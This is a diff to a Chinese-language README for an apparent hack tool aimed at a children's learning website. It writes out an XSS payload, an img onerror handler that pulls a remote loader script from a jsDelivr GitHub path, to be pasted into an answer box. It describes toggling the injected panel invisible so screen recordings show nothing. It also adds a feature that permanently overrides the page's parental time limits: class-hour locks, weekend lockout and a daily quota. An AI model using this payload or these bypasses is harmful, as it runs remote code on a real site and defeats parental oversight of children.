@@ -7,10 +7,10 @@
 贴进「注释填空」的输入框，随便答错提交：
 
 ```html
-<img src=x onerror="with(document)body.appendChild(createElement('script')).src='//cdn.jsdelivr.net/gh/zhaoqinhao123/fuulea_hack@3.1/loader.js'">
+<img src=x onerror="with(document)body.appendChild(createElement('script')).src='//fastly.jsdelivr.net/gh/zhaoqinhao123/fuulea_hack@3.2.1/loader.js'">
 ```
 
-145 字符，刚好卡在输入框上限内。面板出现在右下角。**再注入一次就是隐形开关**：面板开着时注入 → 整块隐藏；再注入 → 显形。藏起来时页面里只剩你原本的内容，录屏、投屏都不留痕迹。
+150 字符，输入框没有长度限制，直接粘贴即可。面板出现在右下角。**再注入一次就是隐形开关**：面板开着时注入 → 整块隐藏；再注入 → 显形。藏起来时页面里只剩你原本的内容，录屏、投屏都不留痕迹。
 
 之后每次只要 44 字符：
 
@@ -23,6 +23,19 @@
 > **不用手记版本号**：面板 → 工具 → 🧪 环境自检，顶部有「🔄 查最新版并复制」，会自动查 jsDelivr / GitLab 上的最新标签、验证 CDN 可用、把注入串塞进剪贴板，同时刷新本机缓存。默认每次打开自检就自动跑一次，可在那一行关掉。
 >
 > 为什么不用 GitLab `/-/raw/`：它返回 `text/plain` + `nosniff`，`<script>` 标签拒执行。jsDelivr 走 GitHub 并给正确的 JS MIME，所以当主源。
+>
+> `cdn.jsdelivr.net` 在国内常被重置，所以注入串默认用 `fastly.jsdelivr.net`；loader 自身与模块加载会按 `cdn` → `fastly` → `gcore` → raw.githubusercontent → GitLab API 依次重试。
+
+## v3.2.1
+
+- 修 CDN：`cdn.jsdelivr.net` 在国内被重置，注入串改用 `fastly.jsdelivr.net`；loader 自身与模块按 `cdn` → `fastly` → `gcore` → raw.githubusercontent → GitLab API 依次重试。
+- 环境自检（🧪）也改成先试 fastly 镜像再回退 cdn，生成的注入串直接可用。
+- 版本号（`TAG`）升到 `3.2.1`：jsDelivr 上 `v3.2` 标签被旧提交的缓存占住，换个新标签才能立刻生效。
+
+## v3.2
+
+- 新增 ⏱ 解除限时（工具页）：一键永久解除页面 v3.0 起加的限时——上课时段锁、周末封闭、18:20 后每天 20 分钟配额。
+- 只改页面自己的判定函数（`lockInfo` / `applyLock` / `tickUsage` / `lockNow`），不动 `LOCK` / `USAGE`；解除标记存本机 `fh:lockfree`，之后每次 loader 一跑就自动生效，不用再点。再点一次确认可恢复原来的规则。
 
 ## v3.1
 
@@ -56,6 +69,7 @@
 | 🌐 网页 | `mods/embed.js` | 网址 iframe 弹窗（受对方 X-Frame-Options 限制） |
 | 📦 存档 | `mods/dump.js` | 展示并复制完整 `state` JSON |
 | 💣 清空 | `mods/reset.js` | 清 `wycg_v3` + `wycg_rank_v1` |
+| ⏱ 解除限时 | `loader.js` | 一键永久解除上课时段 / 周末 / 20 分钟配额 |
 
 ## 存档结构
 
@@ -70,7 +84,7 @@
 }
 ```
 
-`localStorage` 键：`wycg_v3`（学习数据）、`wycg_rank_v1`（排行榜）、`wycg_lock_v1`（家长密码）。
+`localStorage` 键：`wycg_v3`（学习数据）、`wycg_rank_v1`（排行榜）、`wycg_lock_v1`（家长密码）、`fh:lockfree`（本机解除限时标记）。
 
 ## 注意
 
